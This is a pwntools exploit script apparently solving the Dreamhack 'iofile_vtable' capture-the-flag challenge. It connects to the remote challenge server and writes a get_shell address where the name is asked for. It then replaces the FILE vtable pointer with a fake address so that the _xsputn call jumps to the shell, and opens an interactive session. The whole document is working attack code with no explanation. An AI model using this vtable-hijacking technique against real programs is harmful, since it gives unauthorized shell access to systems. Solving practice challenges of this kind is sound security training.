from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 24363);
#p = process("./iofile_vtable")
#p = process("./iofile_vtable")
elf = ELF("./iofile_vtable")
#libc = ELF("./libc-2.27.so")

get_shell = 0x40094a
fake__xsputn = 0x6010d0-0x38

p.sendlineafter(b"what is your name: ", p64(get_shell))
pause()

p.sendlineafter(b"> ", b"4")
p.sendlineafter(b"change: ", p64(fake__xsputn))
p.sendlineafter(b"> ", b"2")

p.interactive()